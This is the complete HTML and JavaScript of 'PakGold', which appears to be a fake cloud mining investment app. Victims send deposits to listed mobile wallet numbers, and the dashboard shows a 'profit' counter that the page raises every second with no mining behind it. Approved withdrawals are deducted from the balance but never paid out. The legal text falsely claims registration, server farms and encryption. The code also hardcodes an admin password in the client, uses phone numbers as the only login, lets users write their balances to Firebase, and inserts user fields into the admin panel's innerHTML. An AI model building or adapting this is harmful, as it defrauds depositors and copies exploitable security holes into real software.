<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PakGold | Premium Asset Management</title>
    <!-- Firebase Core -->
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <!-- Fonts & Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        :root {
            --primary: #c5a059;
            --secondary: #1a1a1a;
            --accent: #f39c12;
            --bg: #fdfdfd;
            --card: #ffffff;
            --text-main: #2c3e50;
            --text-light: #95a5a6;
            --success: #27ae60;
            --error: #e74c3c;
            --shadow: 0 10px 30px rgba(0,0,0,0.05);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: var(--text-main); overflow-x: hidden; }

        /* Smooth Animations */
        .page { display: none; min-height: 100vh; padding-bottom: 100px; animation: fadeInUp 0.5s ease; }
        .page.active { display: block; }

        /* Premium Header */
        .header { background: #fff; padding: 20px 25px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f1f1f1; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.02); }
        .logo { font-weight: 800; font-size: 1.4rem; letter-spacing: -0.5px; }
        .logo span { color: var(--primary); }

        /* Dashboard Hero Card */
        .balance-card { background: linear-gradient(135deg, #ffffff 0%, #f9f9f9 100%); margin: 20px; padding: 30px; border-radius: 30px; border: 1px solid #eee; box-shadow: var(--shadow); position: relative; overflow: hidden; }
        .balance-card::before { content: ''; position: absolute; top: -20px; right: -20px; width: 100px; height: 100px; background: var(--primary); opacity: 0.05; border-radius: 50%; }
        .balance-label { font-size: 0.75rem; font-weight: 600; color: var(--text-light); text-transform: uppercase; letter-spacing: 1px; }
        .main-balance { font-size: 2.8rem; font-weight: 800; color: var(--secondary); margin: 10px 0; }
        .stats-row { display: flex; justify-content: space-between; margin-top: 20px; padding-top: 20px; border-top: 1px solid #f1f1f1; }

        /* Dynamic Grid for Nodes */
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 20px; }
        .node-box { background: var(--card); padding: 25px 15px; border-radius: 25px; border: 1px solid #f1f1f1; text-align: center; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02); }
        .node-box:hover { border-color: var(--primary); transform: translateY(-5px); }
        .node-box h3 { font-size: 1.2rem; color: var(--secondary); }
        .node-box p { color: var(--success); font-weight: 700; font-size: 0.85rem; }

        /* Modern Navigation */
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #f1f1f1; z-index: 999; }
        .nav-btn { text-align: center; color: var(--text-light); font-size: 0.7rem; font-weight: 600; transition: 0.3s; cursor: pointer; flex: 1; }
        .nav-btn.active { color: var(--primary); }
        .nav-btn i { font-size: 1.3rem; margin-bottom: 5px; }

        /* Premium Buttons & Inputs */
        .btn-premium { background: var(--secondary); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 18px; font-weight: 700; font-size: 1rem; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
        .btn-premium:active { transform: scale(0.97); }
        .input-field { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #eee; border-radius: 15px; font-size: 1rem; outline: none; background: #fdfdfd; transition: 0.3s; }
        .input-field:focus { border-color: var(--primary); }

        /* Sidebar Menu */
        .sidebar { position: fixed; left: -100%; top: 0; width: 300px; height: 100%; background: #fff; z-index: 2000; transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1); padding: 50px 30px; }
        .sidebar.open { left: 0; }
        .side-link { padding: 18px 0; border-bottom: 1px solid #f9f9f9; display: flex; align-items: center; gap: 15px; font-weight: 600; color: var(--text-main); cursor: pointer; }
        .overlay { position: fixed; display: none; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.3); backdrop-filter: blur(4px); z-index: 1500; }

        /* Admin Console */
        .admin-item { background: #fff; padding: 20px; border-radius: 15px; border: 1px solid #eee; margin-bottom: 15px; box-shadow: var(--shadow); }
        .badge { padding: 4px 10px; border-radius: 50px; font-size: 0.65rem; font-weight: 700; text-transform: uppercase; }
        .badge-dep { background: #e3f2fd; color: #1976d2; }
        .badge-wit { background: #fbe9e7; color: #d84315; }

        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body onload="initSystem()">

    <!-- Menu & Overlay -->
    <div class="overlay" id="overlay" onclick="toggleMenu()"></div>
    <div class="sidebar" id="sidebar">
        <div class="logo" style="margin-bottom: 40px;">PAK<span>GOLD</span></div>
        <div class="side-link" onclick="navigate('home')"><i class="fa fa-th-large"></i> Dashboard</div>
        <div class="side-link" onclick="navigate('team')"><i class="fa fa-users"></i> My Network</div>
        <div class="side-link" onclick="navigate('promo')"><i class="fa fa-ticket"></i> Promo Center</div>
        <div class="side-link" onclick="navigate('legal')"><i class="fa fa-file-shield"></i> Legal & Terms</div>
        <div class="side-link" onclick="navigate('legal')"><i class="fa fa-building"></i> Company Bio</div>
        <div class="side-link" style="color: var(--error); margin-top: 50px;" onclick="logout()">
            <i class="fa fa-power-off"></i> Secure Logout
        </div>
    </div>

    <!-- Login Section -->
    <section id="login" class="page active">
        <div style="height: 100vh; display: flex; flex-direction: column; justify-content: center; padding: 40px;">
            <div style="text-align: center; margin-bottom: 40px;">
                <h1 class="logo" style="font-size: 2.5rem;">PAK<span>GOLD</span></h1>
                <p style="color: var(--text-light);">Premium Cloud Mining Network</p>
            </div>
            <input type="number" id="auth_ph" class="input-field" placeholder="Mobile Number">
            <input type="password" id="auth_key" class="input-field" placeholder="Admin Terminal Key">
            <button class="btn-premium" onclick="handleAuth()">Access Account</button>
        </div>
    </section>

    <!-- Home Section -->
    <section id="home" class="page">
        <div class="header">
            <div onclick="toggleMenu()"><i class="fa fa-bars-staggered" style="font-size: 1.4rem;"></i></div>
            <div id="display_id" style="font-weight: 800; font-size: 0.8rem; background: #f8f9fa; padding: 8px 15px; border-radius: 50px;">ID: ---</div>
        </div>

        <div class="balance-card">
            <span class="balance-label">Total Earnings (PKR)</span>
            <div class="main-balance" id="display_profit">0.0000</div>
            <div class="stats-row">
                <div><small class="balance-label">Wallet</small><p id="display_wallet" style="font-weight: 800;">Rs 0</p></div>
                <div style="text-align: right;"><small class="balance-label">Hash Rate</small><p id="display_speed" style="color: var(--success); font-weight: 800;">0.00/s</p></div>
            </div>
        </div>

        <h3 style="padding: 0 25px; margin-bottom: 15px;">Investment Nodes</h3>
        <div class="grid" id="node_grid"></div>
    </section>

    <!-- Deposit Section -->
    <section id="deposit" class="page">
        <div style="padding: 25px;">
            <h2 style="margin-bottom: 20px;">Add Capital</h2>
            <div style="background: #fff9e6; border-left: 5px solid var(--accent); padding: 20px; border-radius: 15px; margin-bottom: 25px;">
                <p style="font-size: 0.9rem; line-height: 1.6;">
                    <strong>JazzCash/SADA:</strong> 03705519562<br>
                    <strong>EasyPaisa:</strong> 03379827882<br>
                    <strong>Name:</strong> PakGold Merchant Official
                </p>
            </div>
            <input type="number" id="dep_amt" class="input-field" placeholder="Amount (PKR)">
            <input type="text" id="dep_tid" class="input-field" placeholder="Transaction ID (TID)">
            <p style="margin-bottom: 10px; font-weight: 600; font-size: 0.8rem;">Attach Screenshot:</p>
            <input type="file" class="input-field" style="padding: 10px;">
            <button class="btn-premium" onclick="requestDeposit()">Submit Deposit</button>
        </div>
    </section>

    <!-- Withdraw Section -->
    <section id="withdraw" class="page">
        <div style="padding: 25px;">
            <h2 style="margin-bottom: 20px;">Withdraw Funds</h2>
            <select id="wit_method" class="input-field">
                <option value="JazzCash">JazzCash</option>
                <option value="EasyPaisa">EasyPaisa</option>
                <option value="Bank Transfer">Bank Transfer</option>
                <option value="Binance (USDT)">Binance (USDT)</option>
            </select>
            <input type="text" id="wit_acc" class="input-field" placeholder="Account Number / Wallet Address">
            <input type="text" id="wit_name" class="input-field" placeholder="Account Title / Username">
            <input type="number" id="wit_amt" class="input-field" placeholder="Amount (Min. 500)">
            <button class="btn-premium" onclick="requestWithdrawal()" style="background: var(--primary);">Confirm Withdrawal</button>
        </div>
    </section>

    <!-- Legal Section -->
    <section id="legal" class="page">
        <div style="padding: 25px;">
            <h2 style="margin-bottom: 20px;">Legal Information</h2>
            <div style="line-height: 1.8; color: var(--text-light);">
                <h4 style="color: var(--secondary);">Company Profile</h4>
                <p>PakGold is a premier cloud mining service registered for digital asset management. We utilize advanced server farms to generate steady hash-rate returns for our global investors.</p>
                <br>
                <h4 style="color: var(--secondary);">Privacy Policy</h4>
                <p>Your data is encrypted using 256-bit SSL protocols. We never share user identities with third-party vendors. Withdrawals are manually audited for security.</p>
            </div>
        </div>
    </section>

    <!-- Promo Section -->
    <section id="promo" class="page">
        <div style="padding: 25px; text-align: center;">
            <i class="fa fa-gift" style="font-size: 4rem; color: var(--primary); margin-bottom: 20px;"></i>
            <h2>Promo Codes</h2>
            <p style="color: var(--text-light); margin-bottom: 30px;">Enter a valid code to claim instant wallet rewards.</p>
            <input type="text" id="promo_input" class="input-field" placeholder="Enter Code Here">
            <button class="btn-premium" onclick="claimPromo()">Claim Now</button>
        </div>
    </section>

    <!-- Admin Section -->
    <section id="admin" class="page" style="background: #f4f7f6; padding: 25px;">
        <h2 style="margin-bottom: 30px;">Admin Command Center</h2>
        <div id="admin_requests"></div>
    </section>

    <nav class="nav-bar" id="bottom_nav" style="display: none;">
        <div class="nav-btn active" onclick="navigate('home')"><i class="fa fa-house"></i><br>Home</div>
        <div class="nav-btn" onclick="navigate('deposit')"><i class="fa fa-wallet"></i><br>Deposit</div>
        <div class="nav-btn" onclick="navigate('withdraw')"><i class="fa fa-arrow-up-right-from-square"></i><br>Withdraw</div>
        <div class="nav-btn" onclick="toggleMenu()"><i class="fa fa-bars"></i><br>Menu</div>
    </nav>

    <script>
        // --- Configuration ---
        const config = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };
        firebase.initializeApp(config);
        const db = firebase.database();
        let currentPh = localStorage.getItem('active_user');

        function initSystem() {
            if(currentPh) {
                navigate('home');
                startSync();
            }
            renderNodeCards();
        }

        function handleAuth() {
            let p = document.getElementById('auth_ph').value;
            let k = document.getElementById('auth_key').value;
            if(k === "pakgold786") return navigate('admin'), loadAdminTerminal();
            if(p.length < 10) return alert("System error: Valid number required.");
            
            currentPh = p;
            localStorage.setItem('active_user', p);
            db.ref('users/' + p).once('value', s => {
                if(!s.exists()) {
                    db.ref('users/' + p).set({
                        wallet: 0, profit: 0, speed: 0, 
                        uid: 'PG-' + Math.floor(1000 + Math.random() * 9000)
                    });
                }
                location.reload();
            });
        }

        function startSync() {
            db.ref('users/' + currentPh).on('value', s => {
                let d = s.val();
                document.getElementById('display_wallet').innerText = "Rs " + d.wallet;
                document.getElementById('display_profit').innerText = parseFloat(d.profit).toFixed(4);
                document.getElementById('display_id').innerText = "ID: " + d.uid;
                document.getElementById('display_speed').innerText = d.speed + "/s";
            });

            setInterval(() => {
                db.ref('users/' + currentPh).once('value', s => {
                    let d = s.val();
                    if(d.speed > 0) {
                        db.ref('users/' + currentPh).update({
                            profit: (parseFloat(d.profit) + d.speed).toFixed(4)
                        });
                    }
                });
            }, 1000);
        }

        function renderNodeCards() {
            const container = document.getElementById('node_grid');
            for(let i=1; i<=15; i++) {
                container.innerHTML += `
                <div class="node-box" onclick="buyNode(${i*750}, ${0.0004*i})">
                    <i class="fa fa-server" style="color:var(--primary); font-size:1.5rem; margin-bottom:10px;"></i>
                    <h3>Level ${i}</h3>
                    <p>Rs ${i*750}</p>
                    <small style="color:var(--text-light); font-size:0.6rem;">Speed: ${i*0.0004}/s</small>
                </div>`;
            }
        }

        function buyNode(cost, speed) {
            db.ref('users/' + currentPh).once('value', s => {
                if(s.val().wallet < cost) return alert("Insufficient Balance.");
                db.ref('users/' + currentPh).update({
                    wallet: s.val().wallet - cost,
                    speed: speed
                });
                alert("Node activated successfully!");
            });
        }

        function requestDeposit() {
            let a = document.getElementById('dep_amt').value;
            let t = document.getElementById('dep_tid').value;
            if(!a || !t) return alert("Fill all details.");
            db.ref('master_queue').push({ user: currentPh, amt: a, tid: t, type: 'Deposit', status: 'pending' });
            alert("Deposit submitted for verification.");
        }

        function requestWithdrawal() {
            let a = document.getElementById('wit_amt').value;
            let m = document.getElementById('wit_method').value;
            let acc = document.getElementById('wit_acc').value;
            let n = document.getElementById('wit_name').value;
            if(a < 500) return alert("Minimum withdrawal is Rs 500.");
            db.ref('users/' + currentPh).once('value', s => {
                if(s.val().wallet < a) return alert("Insufficient funds.");
                db.ref('master_queue').push({ 
                    user: currentPh, amt: a, method: m, account: acc, name: n, type: 'Withdrawal', status: 'pending' 
                });
                db.ref('users/' + currentPh).update({ wallet: s.val().wallet - a });
                alert("Withdrawal request logged.");
            });
        }

        function claimPromo() {
            let code = document.getElementById('promo_input').value;
            db.ref('master_queue').push({ user: currentPh, code: code, type: 'Promo', status: 'pending' });
            alert("Promo claim sent to admin.");
        }

        function loadAdminTerminal() {
            db.ref('master_queue').on('value', s => {
                const list = document.getElementById('admin_requests');
                list.innerHTML = "";
                s.forEach(child => {
                    let r = child.val();
                    if(r.status === 'pending') {
                        list.innerHTML += `
                        <div class="admin-item">
                            <span class="badge ${r.type==='Deposit'?'badge-dep':'badge-wit'}">${r.type}</span>
                            <p style="margin:10px 0;">User: ${r.user} | Value: ${r.amt || r.code}</p>
                            <small>Info: ${r.tid || r.method + ' ' + r.account}</small><br><br>
                            <button onclick="approveReq('${child.key}', '${r.user}', ${r.amt||0}, '${r.type}')" style="background:var(--success); color:white; border:none; padding:8px 15px; border-radius:8px;">Approve</button>
                            <button onclick="rejectReq('${child.key}')" style="background:var(--error); color:white; border:none; padding:8px 15px; border-radius:8px; margin-left:10px;">Reject</button>
                        </div>`;
                    }
                });
            });
        }

        function approveReq(key, ph, amt, type) {
            db.ref('users/' + ph).once('value', s => {
                let credit = (type === 'Promo') ? 200 : parseInt(amt);
                if(type === 'Deposit' || type === 'Promo') {
                    db.ref('users/' + ph).update({ wallet: s.val().wallet + credit });
                }
                db.ref('master_queue/' + key).update({ status: 'approved' });
                alert("Request Verified.");
            });
        }

        function rejectReq(key) { db.ref('master_queue/' + key).remove(); }

        function navigate(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('bottom_nav').style.display = (id === 'admin') ? 'none' : 'flex';
            if(document.getElementById('sidebar').classList.contains('open')) toggleMenu();
        }

        function toggleMenu() {
            document.getElementById('sidebar').classList.toggle('open');
            let ov = document.getElementById('overlay');
            ov.style.display = (ov.style.display === 'block') ? 'none' : 'block';
        }

        function logout() { localStorage.clear(); location.reload(); }
    </script>
</body>
</html>
